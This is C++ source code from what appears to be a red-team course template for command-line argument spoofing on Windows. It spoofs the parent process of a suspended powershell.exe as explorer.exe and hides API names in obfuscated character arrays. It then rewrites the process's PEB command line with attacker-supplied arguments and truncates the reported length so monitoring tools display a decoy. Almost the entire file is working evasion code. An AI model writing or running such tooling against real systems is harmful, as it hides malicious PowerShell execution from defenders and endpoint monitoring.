/*

 Red Team Operator course code template
 Cmdline args spoofing
 
 author: reenz0h (twitter: @SEKTOR7net)
 credits: Adam Chester

*/

#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include "helpers.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <stdlib.h>
#include <string.h>
using namespace std;
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")



typedef NTSTATUS(WINAPI * NtQueryInformationProcess_t)(
	IN HANDLE,
	IN PROCESSINFOCLASS,
	OUT PVOID,
	IN ULONG,
	OUT PULONG
	);

typedef  NTSTATUS(WINAPI* ReadProcessMemory_t)(
	HANDLE  hProcess, 
	LPCVOID lpBaseAddress,
	LPVOID  lpBuffer, 
	SIZE_T  nSize, 
	SIZE_T* lpNumberOfBytesRead
	);
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned int sNtdll_len = sizeof(sNtdll);

DWORD GetPidByName(const char* pName) {
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //获取进程快照

	if (Process32First(snapshot, &pEntry) == TRUE) { //get first Handle
		while (Process32Next(snapshot, &pEntry) == TRUE) { //Get second Handle
			if (_stricmp(pEntry.szExeFile, pName) == 0) {
				return pEntry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(int argc, char ** argv) {
	STARTUPINFOEX si = { sizeof(si) };
	STARTUPINFOA tsi = { 0 };
	PROCESS_INFORMATION pi;
	CONTEXT context;
	BOOL success;
	PROCESS_BASIC_INFORMATION pbi;
	DWORD retLen;
	SIZE_T bytesRead;
	SIZE_T bytesWritten;
	PEB pebLocal;
	RTL_USER_PROCESS_PARAMETERS parameters = { sizeof(parameters) };
	printf("%s", argv[1]);
	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	DWORD dwPid = 0;
	dwPid = GetPidByName("explorer.exe");
	if (dwPid == 0)
		dwPid = GetCurrentProcessId();

	// create fresh attributelist
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);
	// copy and spoof parent process ID
	HANDLE hParentProcess = NULL;
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	UpdateProcThreadAttribute(pAttributeList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&hParentProcess,
		sizeof(HANDLE),
		NULL,
		NULL);
	si.lpAttributeList = pAttributeList;
	// Start process suspended
	success = CreateProcessA(
							NULL, 
							(LPSTR) "powershell.exe 123",
							NULL, 
							NULL, 
							FALSE, 
							CREATE_SUSPENDED| EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
							NULL, 
							"C:\\Windows\\System32\\", 
							&si.StartupInfo,
							&pi);

	if (success == FALSE) {
		printf("Could not call CreateProcess\n");
		return 1;
	}
	DeleteProcThreadAttributeList(pAttributeList);
	CloseHandle(hParentProcess);
	unsigned char sNtQueryInformationProcess[] = { 'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','P','r','o','c','e','s','s',0 };
	unsigned char sReadProcessMemory[] = { 'R','e','a','d','P','r','o','c','e','s','s','M','e','m','o','r','y',0 };

	// Retrieve information on PEB location in process
	NtQueryInformationProcess_t NtQueryInformationProcess_p = (NtQueryInformationProcess_t) hlpGetProcAddress(LoadLibraryA((LPCSTR)sNtdll), (LPCSTR)sNtQueryInformationProcess);
	ReadProcessMemory_t ReadProcessMemory_p = (ReadProcessMemory_t) hlpGetProcAddress(LoadLibraryA((LPCSTR)sKernel32), (LPCSTR)sReadProcessMemory);
	NtQueryInformationProcess_p(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

	// Read the PEB from the target process
	
	success = ReadProcessMemory_p(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
	if (success == FALSE) {
		printf("Could not call ReadProcessMemory to grab PEB\n");
		return 1;
	}
	
	// Grab the ProcessParameters from PEB
	ReadProcessMemory_p(pi.hProcess, 
						pebLocal.ProcessParameters, 
						&parameters, 
						sizeof(parameters), 
						&bytesRead);
	
	// Set the actual arguments we are looking to use
	
	size_t len = strlen(argv[1]) + 1;
	size_t converted = 0;
	WCHAR *spoofedArgs = new wchar_t[len];
	mbstowcs_s(&converted, spoofedArgs, len, argv[1], _TRUNCATE);
	wcout << wcslen(spoofedArgs) << endl;
	success = WriteProcessMemory(pi.hProcess, parameters.CommandLine.Buffer, spoofedArgs, wcslen(spoofedArgs)*2, &bytesWritten);
	if (success == FALSE) {
		printf("Could not call WriteProcessMemory to update commandline args\n");
		return 1;
	}
	
	//printf("STOP! I DARE YOU!\n"); getchar();
	
	// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer and Task Manager

	// Update the CommandLine length (Remember, UNICODE length here)
	DWORD newUnicodeLen = 28;
	
	success = WriteProcessMemory(pi.hProcess, 
								(char *) pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), 
								(void *) &newUnicodeLen, 
								4,
								&bytesWritten
								);
	if (success == FALSE) {
		printf("Could not call WriteProcessMemory to update commandline arg length\n");
		return 1;
	}

	//printf("Hitme!\n");	getchar();

	// Resume thread execution*/
	ResumeThread(pi.hThread);
	//getchar();
}